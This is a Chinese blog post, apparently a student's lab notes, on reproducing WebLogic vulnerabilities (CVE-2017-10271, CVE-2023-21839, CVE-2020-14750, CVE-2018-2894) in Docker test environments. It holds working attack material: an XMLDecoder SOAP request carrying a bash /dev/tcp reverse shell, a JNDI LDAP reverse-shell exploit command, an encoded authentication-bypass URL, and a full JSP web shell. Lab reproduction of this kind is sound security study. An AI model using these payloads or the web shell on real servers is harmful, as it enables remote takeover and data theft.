@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>weblogic | You_zip</title><meta name="keywords" content="weblogic"><meta name="author" content="Youzipii"><meta name="copyright" content="Youzipii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Weblogic简要介绍https:&#x2F;&#x2F;blog.csdn.net&#x2F;rumil&#x2F;article&#x2F;details&#x2F;133036788 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;372568.html Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="weblogic">
+<meta property="og:url" content="http://example.com/2024/07/23/weblogic/index.html">
+<meta property="og:site_name" content="You_zip">
+<meta property="og:description" content="Weblogic简要介绍https:&#x2F;&#x2F;blog.csdn.net&#x2F;rumil&#x2F;article&#x2F;details&#x2F;133036788 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;372568.html Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg">
+<meta property="article:published_time" content="2024-07-23T06:48:31.000Z">
+<meta property="article:modified_time" content="2024-07-23T06:54:46.941Z">
+<meta property="article:author" content="Youzipii">
+<meta property="article:tag" content="weblogic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/07/23/weblogic/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'weblogic',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-23 14:54:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">You_zip</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">weblogic</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-23T06:48:31.000Z" title="发表于 2024-07-23 14:48:31">2024-07-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-23T06:54:46.941Z" title="更新于 2024-07-23 14:54:46">2024-07-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="weblogic"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rumil/article/details/133036788">https://blog.csdn.net/rumil/article/details/133036788</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/372568.html">https://www.freebuf.com/articles/web/372568.html</a></p>
+<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机。T3协议在开放WebLogic控制台端口的应用上默认开启。攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击（开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。）</p>
+<p>T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</p>
+<p><strong>T3协议：</strong></p>
+<p>用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。</p>
+<p><strong>RMI方法：</strong></p>
+<p>远程方法调用，除了该对象本身的虚拟机，其它的虚拟机也可以调用该对象的方法。（对象的虚拟化和反序列化广泛应用到RMI和网络传输中）</p>
+<p><strong>JRMP：</strong></p>
+<p>Java远程消息交换协议JRMP。</p>
+<p>JRMP是一个Java远程方法协议，该协议基于TCP&#x2F;IP之上，RMI协议之下。也就是说RMI该协议传递时底层使用的是JRMP协议，而JRMP底层则是基于TCP传递。</p>
+<p>RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI去进行实现的。</p>
+<h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>简要介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chen-w/p/14652153.html">https://www.cnblogs.com/chen-w/p/14652153.html</a></p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先使用docker起一个weblogic CVE-2017-1027的环境，进入到vulhub&#x2F;weblogic&#x2F;CVE-2017-1027</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>启动成功后</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716213102663.png" alt="image-20240716213102663"></p>
+<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p>查看运行状态</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716213125924.png" alt="image-20240716213125924"></p>
+<p>接着去访问本机的7001端口，出现如下页面，说明服务成功开启：</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716214217994.png" alt="image-20240716214217994"></p>
+<p>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716214533663.png" alt="image-20240716214533663"></p>
+<p>可以先扫一下服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716222238125.png" alt="image-20240716222238125"></p>
+<p>用相关漏洞的扫描工具也可以</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716222344082.png" alt="image-20240716222344082"></p>
+<h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vpsip/ncport 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718205520947.png" alt="image-20240718205520947"></p>
+<p>能弹啊，docker为什么弹不了，还要配置网卡吗</p>
+<p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.1.15:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 637</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.137/888 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">12345678910111213141516171819202122232425262728293031</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic 允许远程用户在未经授权的情况下通过IIOP&#x2F;T3进行JNDI lookup 操作，当JDK版本过低或本地存在javaSerializedData时，这可能会导致RCE漏洞。</p>
+<p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>WebLogic_Server &#x3D; 12.2.1.3.0<br>WebLogic_Server &#x3D; 12.2.1.4.0<br>WebLogic_Server &#x3D; 14.1.1.0.0<br><strong>CVE-2023-21839是一个weblogic的JNDI注入漏洞。</strong></p>
+<p>由于Weblogic t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行。</p>
+<h3 id="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"><a href="#环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）" class="headerlink" title="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"></a>环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095001438.png" alt="image-20240717095001438"></p>
+<p>访问靶场地址：</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095020526.png" alt="image-20240717095020526"></p>
+<p>Nmap扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095129769.png" alt="image-20240717095129769"></p>
+<p>扫描验证T3是否开启：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095226815.png" alt="image-20240717095226815"></p>
+<p>开启LDAP和HTTP服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137	//攻击者ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717224640807.png" alt="image-20240717224640807"></p>
+<p>监听端口（用于接收反弹的shell）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717224800690.png" alt="image-20240717224800690"></p>
+<p>使用工具包</p>
+<p>j教程使用的：<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/CVE-2023-21839">GitHub - ASkyeye&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE)</a></p>
+<p>这个下载下来要在linux环境下编译，windows下编译了好像不行用，不懂是什么问题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.174.137 -port 7001 -ldap ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/9999</span><br></pre></td></tr></table></figure>
+
+<p>因为担心docker在虚拟机nat不通就没在外面测试了</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717225351922.png" alt="image-20240717225351922"></p>
+<p>最后也是成功反弹shell了，这个java的漏洞的环境太难搭了</p>
+<p>成功复现，记得关闭docker启动的镜像</p>
+<p>关闭镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure>
+
+<p>因为docker-compose up -d也是拉镜像启动，所以本地会有镜像保留，有些还挺大的，不需要的话可以删了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker rmi -f 镜像id</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2020-14750"><a href="#CVE-2020-14750" class="headerlink" title="CVE-2020-14750"></a>CVE-2020-14750</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2168616">https://cloud.tencent.com/developer/article/2168616</a></p>
+<h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p><strong>- WebLogic Console权限认证绕过漏洞（CVE-2020-14750） -</strong> </p>
+<p>Weblogic Server是Oracle公司的一款适用于云环境和传统环境的应用<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。Oracle官方在2020年10月发布了关键补丁更新公告，其中包括一个CVE-2020-14750为 WebLogic Console权限认证绕过的漏洞CVE-2020-14882补丁的绕过漏洞，CVSS 评分 9.8 分。CVE-2020-14882 补丁被绕过后，攻击者就可以再度绕过Console控制台的权限校验，访问原本需要登录才可以访问的资源和接口功能。尽管 CVE-2020-14883 这个后台的任意代码执行漏洞已被修复，但攻击者依然可以通过寻找利用其他合适的后台接口漏洞，实现远程代码执行，从而获取服务器权限。</p>
+<p>影响版本：</p>
+<ul>
+<li>Oracle WebLogic Server 10.3.6.0.0</li>
+<li>Oracle WebLogic Server 12.1.3.0.0</li>
+<li>Oracle WebLogic Server 12.2.1.3.0</li>
+<li>Oracle WebLogic Server 12.2.1.4.0</li>
+<li>Oracle WebLogic Server 14.1.1.0.0</li>
+</ul>
+<h4 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h4><p>使用<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/0xn0ne/WeblogicScanner&source=article&objectId=2168616">WeblogicScaner</a>工具检测目标网站存在CVE-2020-14750漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ws.py -t http://172.16.14.149:7001 -v CVE-2020-14750</span><br></pre></td></tr></table></figure>
+
+<p>构造特殊URL地址绕过WebLogic Console控制台权限进行访问：</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718114246101.png" alt="image-20240718114246101"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718114220535.png" alt="image-20240718114220535"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/console/css/%25%32%65%25%32%65%25%32%66/console.portal</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718114153961.png" alt="image-20240718114153961"></p>
+<h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51198941/article/details/134193310">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p>
+<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do</p>
+<p>这里进后台的部分借用前面的漏洞</p>
+<p>访问漏洞页面（需要手动设置一下环境设置Work Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718123446376.png" alt="image-20240718123446376"></p>
+<p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为fafa）；</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fafa&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718123559300.png" alt="image-20240718123559300"></p>
